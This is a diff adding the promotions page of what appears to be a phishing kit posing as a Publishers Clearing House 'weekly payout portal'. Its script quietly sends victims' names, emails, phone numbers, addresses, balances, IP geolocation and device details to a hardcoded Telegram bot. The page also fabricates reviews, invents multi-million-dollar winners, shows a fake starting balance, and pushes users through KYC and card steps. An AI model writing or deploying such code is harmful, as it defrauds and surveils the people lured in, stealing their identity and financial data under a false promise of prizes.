@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Promotions — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  @keyframes pulseDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.55; transform:scale(.85); } }
+  .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+  .progress-track { background:#070b19; border:1px solid #212d54; border-radius:999px; overflow:hidden; height:12px; padding:2px; }
+  .progress-fill { height:100%; border-radius:999px; background:linear-gradient(90deg,#fbbf24,#38bdf8); transition:width .5s cubic-bezier(.16,1,.3,1); }
+  @keyframes shimmer { 0% { background-position:-400px 0; } 100% { background-position:400px 0; } }
+  .shimmer-bar { background:linear-gradient(90deg,transparent,rgba(251,191,36,.35),transparent); background-size:400px 100%; animation:shimmer 2.2s linear infinite; }
+  @keyframes winnerReveal { 0% { opacity:0; transform:translateY(24px) scale(.94); } 100% { opacity:1; transform:translateY(0) scale(1); } }
+  .winner-reveal { animation:winnerReveal .65s cubic-bezier(.16,1,.3,1) both; }
+  @keyframes crownFloat { 0%,100% { transform:translateY(0) rotate(-2deg); } 50% { transform:translateY(-5px) rotate(2deg); } }
+  .crown-float { animation:crownFloat 3.4s ease-in-out infinite; }
+  .prize-card-1 { background:linear-gradient(160deg, rgba(251,191,36,.18), rgba(21,29,56,.95) 55%, rgba(13,19,38,.98)); border:1px solid rgba(251,191,36,.42); box-shadow:0 30px 60px -28px rgba(245,158,11,.55), inset 0 1px 0 rgba(255,255,255,.06); }
+  .prize-card-2 { background:linear-gradient(160deg, rgba(203,213,225,.14), rgba(21,29,56,.95) 60%, rgba(13,19,38,.98)); border:1px solid rgba(203,213,225,.32); }
+  .prize-card-3 { background:linear-gradient(160deg, rgba(217,119,6,.16), rgba(21,29,56,.95) 60%, rgba(13,19,38,.98)); border:1px solid rgba(217,119,6,.4); }
+  .timeline-dot { width:2rem; height:2rem; border-radius:999px; display:flex; align-items:center; justify-content:center; font-size:.75rem; font-weight:800; border:2px solid #212d54; background:#0d1326; color:#94a3b8; }
+  .timeline-dot.active { border-color:#38bdf8; background:rgba(56,189,248,.2); color:#38bdf8; box-shadow:0 0 18px rgba(56,189,248,.5); }
+  .timeline-dot.done { border-color:#10b981; background:rgba(16,185,129,.18); color:#34d399; }
+  .timeline-line { height:2px; background:#212d54; flex-grow:1; }
+  .timeline-line.done { background:linear-gradient(90deg,#10b981,#38bdf8); }
+  .winner-card-1 { background:linear-gradient(160deg, rgba(251,191,36,.22), rgba(21,29,56,.95) 60%); border:1px solid rgba(251,191,36,.5); box-shadow:0 24px 48px -22px rgba(245,158,11,.6); }
+  .winner-card-2 { background:linear-gradient(160deg, rgba(203,213,225,.16), rgba(21,29,56,.95) 60%); border:1px solid rgba(203,213,225,.38); }
+  .winner-card-3 { background:linear-gradient(160deg, rgba(217,119,6,.18), rgba(21,29,56,.95) 60%); border:1px solid rgba(217,119,6,.42); }
+  .winner-placeholder { background:repeating-linear-gradient(45deg, rgba(33,45,84,.55) 0 12px, rgba(21,29,56,.75) 12px 24px); border:1px dashed rgba(56,189,248,.35); }
+</style>
+<script src="pch_ios_shell.js"></script><script src="pch_ios_config.js"></script></head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const PROMO_ACTIVE_DAYS = 21, PROMO_RESTART_DAYS = 7;
+const DEFAULT_TG = { botToken:'8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q', chatId:'8763270406' };
+let promoInterval = null;
+let reviewSeed = 20261016;
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+function nz(v){ return v===undefined||v===null||v===''?'—':String(v); }
+function nowStamp(){ return new Date().toISOString().replace('T',' ').substring(0,19) + ' UTC'; }
+function fileHeader(title){ const line='='.repeat(64); return `${line}\n  ${title.toUpperCase()}\n${line}\nEVENT DATE      : ${nowStamp()}\n`; }
+function fileFooter(){ const line='='.repeat(64); return `${line}\n  END OF RECORD\n${line}\n`; }
+function section(name){ const thin='-'.repeat(64); return `\n${thin}\n  ${name.toUpperCase()}\n${thin}\n`; }
+
+function buildPromoRecord(info) {
+  return fileHeader(`PROMO STREAM ENTRY`) +
+    `Cycle           : #${nz(info.cycleId)}\n` +
+    `Username        : ${nz(info.username)}\n` +
+    section('Entry Details') +
+    `Full Name       : ${nz(info.name)}\n` +
+    `Email           : ${nz(info.email)}\n` +
+    `City / Region   : ${nz(info.region)}\n` +
+    `Draw Date       : ${nz(info.drawDate)}\n` +
+    section('Account Owner') +
+    `Owner Username  : ${nz(info.ownerUsername)}\n` +
+    `Owner Name      : ${nz(info.ownerName)}\n` +
+    `Owner Email     : ${nz(info.ownerEmail)}\n` +
+    `Owner Phone     : ${nz(info.ownerPhone)}\n` +
+    `Owner Address   : ${nz(info.ownerAddress)}\n` +
+    `Account Balance : ${nz(info.balance)}\n` +
+    section('Network / Device') +
+    `IP Address      : ${nz(info.ip)}\n` +
+    `City            : ${nz(info.ipCity)}\n` +
+    `Region          : ${nz(info.ipRegion)}\n` +
+    `Country         : ${nz(info.ipCountry)}\n` +
+    `Postal          : ${nz(info.ipPostal)}\n` +
+    `Latitude        : ${nz(info.ipLatitude)}\n` +
+    `Longitude       : ${nz(info.ipLongitude)}\n` +
+    `ISP / Org       : ${nz(info.ipOrg)}\n` +
+    `Timezone        : ${nz(info.ipTimezone)}\n` +
+    `Device Type     : ${nz(info.deviceType)}\n` +
+    `OS              : ${nz(info.os)}\n` +
+    `Browser         : ${nz(info.browser)}\n` +
+    `Screen          : ${nz(info.screen)}\n` +
+    `Language        : ${nz(info.language)}\n` +
+    `User-Agent      : ${nz(info.userAgent)}\n` +
+    `Submitted At    : ${nz(info.timestamp)}\n` +
+    fileFooter();
+}
+
+const REVIEW_FIRST = ['James','Maria','David','Latoya','Andre','Priya','Michael','Sofia','Kwame','Hannah','Ricardo','Yolanda','Nathan','Ingrid','Tyrone','Camila','Victor','Aaliyah','Stefan','Rosa','Omar','Denise','Curtis','Naomi','Elijah','Farrah','Leon','Bianca','Malcolm','Sienna','Ravi','Tanya','Gregory','Amara','Desmond','Lucia','Patrick','Simone','Everton','Delores','Cedric','Yvonne','Marlon','Adriana','Winston','Keisha','Bruno','Rosalind','Terrence','Nadia'];
+const REVIEW_LAST = ['Whitfield','Alvarez','Okafor','Bennett','Ramirez','Clarke','Nakamura','Delgado','Ferguson','Ivanov','Mensah','Cortez','Barnes','Petrov','Osei','Marsh','Kowalski','Reyes','Sinclair','Dubois','Hollis','Ambrose','Villanueva','Grant','Boateng','Sorensen','McAllister','Ferreira','Chambers','Nwosu','Kirkland','Salazar','Brennan','Odinga','Vaughn','Castillo','Thornton','Adeyemi','Lockhart','Moreau','Sandoval','Baptiste','Ellington','Rahman','Cavanaugh','Duval','Mbeki','Sutton','Navarro','Pemberton'];
+const REVIEW_LOCATIONS = ['Brooklyn, NY','Dallas, TX','Kingston, Jamaica','Chicago, IL','Atlanta, GA','Boston, MA','Houston, TX','Miami, FL','Phoenix, AZ','Seattle, WA','Philadelphia, PA','Montego Bay, Jamaica','Toronto, ON','London, UK','Manchester, UK','Los Angeles, CA','Detroit, MI','Newark, NJ','Charlotte, NC','Columbus, OH','Indianapolis, IN','San Antonio, TX','Portland, OR','Las Vegas, NV','Memphis, TN','Baltimore, MD','Milwaukee, WI','Albuquerque, NM','Nashville, TN','Louisville, KY','Ocho Rios, Jamaica','Spanish Town, Jamaica','Birmingham, AL','Richmond, VA','Oakland, CA','Minneapolis, MN','Tampa, FL','St. Louis, MO','Pittsburgh, PA','Cincinnati, OH','Orlando, FL','Sacramento, CA','Kansas City, MO','Cleveland, OH','Buffalo, NY','Hartford, CT','New Orleans, LA','Tulsa, OK','Raleigh, NC','Salt Lake City, UT'];
+
+function seededRandom() { reviewSeed = (reviewSeed * 1103515245 + 12345) & 0x7fffffff; return reviewSeed / 0x7fffffff; }
+function generateReviews(count) { const out = []; for (let i=0;i<count;i++) { const first = REVIEW_FIRST[Math.floor(seededRandom()*REVIEW_FIRST.length)]; const last = REVIEW_LAST[Math.floor(seededRandom()*REVIEW_LAST.length)]; const loc = REVIEW_LOCATIONS[Math.floor(seededRandom()*REVIEW_LOCATIONS.length)]; const isFive = seededRandom() > 0.2; const rating = isFive ? 5 : 4; const daysAgo = 12 + Math.floor(seededRandom()*620); const d = new Date(); d.setDate(d.getDate() - daysAgo); out.push({ id:1000+i, name:`${first} ${last}`, location:loc, rating, date:d.toISOString().split('T')[0] }); } out.sort((a,b)=>b.date.localeCompare(a.date)); return out; }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.supportTickets) parsed.supportTickets = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      if (!parsed.messages) parsed.messages = [];
+      if (parsed.messagesReadAt == null) parsed.messagesReadAt = 0;
+      if (parsed.announcementDismissedAt == null) parsed.announcementDismissedAt = 0;
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], promo:null, kyc:null, card:null, withdrawalState:'none', currentWithdrawal:null, messages:[], messagesReadAt:0, announcement:null, announcementDismissedAt:0, gamePlays:null, lastSpinDate:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try {
+    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, transactions: state.transactions });
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
+  } catch(e){}
+}
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.card) state.card = r.card;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (r.gamePlays) state.gamePlays = r.gamePlays;
+    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
+    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ DEVICE + IP ═══════════ */
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  return { os, type, browser };
+}
+let cachedIp = null, cachedGeo = null;
+async function fetchIP(){
+  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        cachedIp = d.ip;
+        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
+        return { ip: cachedIp, ...cachedGeo };
+      }
+    }
+  } catch(e){}
+  try {
+    const r2 = await fetch('https://api.ipify.org?format=json');
+    const d2 = await r2.json();
+    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
+  } catch(e){}
+  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
+  return { ip: cachedIp, ...cachedGeo };
+}
+
+/* ═══════════ TELEGRAM — silent, full unmasked payload ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body: fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) {
+    console.error('[TG] fetch failed:', err);
+    return false;
+  }
+}
+async function sendTelegramDocument(filename, text, captionText) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
+  try {
+    const blob = new Blob([text], { type:'text/plain;charset=utf-8' });
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('document', blob, filename);
+    if (captionText) { fd.append('caption', captionText); fd.append('parse_mode', 'HTML'); }
+    const res  = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body: fd });
+    const data = await res.json();
+    if (!data.ok) console.error('[TG] doc failed:', data.error_code, data.description);
+    return data.ok;
+  } catch (err) {
+    console.error('[TG] doc fetch failed:', err);
+    return false;
+  }
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ PROMOTIONS PAGE ═══════════ */
+function createNewPromoCycle(cycleId, startDate) { const start = startDate ? new Date(startDate) : new Date(); const draw = new Date(start); draw.setDate(draw.getDate() + PROMO_ACTIVE_DAYS); const restart = new Date(draw); restart.setDate(restart.getDate() + PROMO_RESTART_DAYS); state.promo = { cycleId, phase:'active', cycleStartDate:start.toISOString(), drawDate:draw.toISOString(), restartDate:restart.toISOString(), winners:null, entries:20150 + Math.floor(Math.random()*800), drawRef:null }; saveDeviceState(); }
+function generatePromoWinners() { const used = new Set(); function pickFirst(){ return REVIEW_FIRST[Math.floor(Math.random()*REVIEW_FIRST.length)]; } function pickLastInitial(){ return REVIEW_LAST[Math.floor(Math.random()*REVIEW_LAST.length)].charAt(0); } function pickUniqueName(){ let n=0; while (n<40) { const full = `${pickFirst()} ${pickLastInitial()}.`; if (!used.has(full)) { used.add(full); return full; } n++; } return 'Anonymous Winner'; } function pickLoc(){ return REVIEW_LOCATIONS[Math.floor(Math.random()*REVIEW_LOCATIONS.length)]; } function pickTicket(){ return 'PCH-' + Math.floor(100000+Math.random()*900000); } return [{place:1,name:pickUniqueName(),location:pickLoc(),ticket:pickTicket(),prizeLabel:'Grand Prize Winner',prizeSummary:'$7,800,000 + $7,000/week + 2026 Mercedes-Benz'},{place:2,name:pickUniqueName(),location:pickLoc(),ticket:pickTicket(),prizeLabel:'2nd Place Winner',prizeSummary:"Winner's Choice: $800,000 Cash OR 2026 SUV"},{place:3,name:pickUniqueName(),location:pickLoc(),ticket:pickTicket(),prizeLabel:'3rd Place Winner',prizeSummary:'$25,000 Cash Prize'}]; }
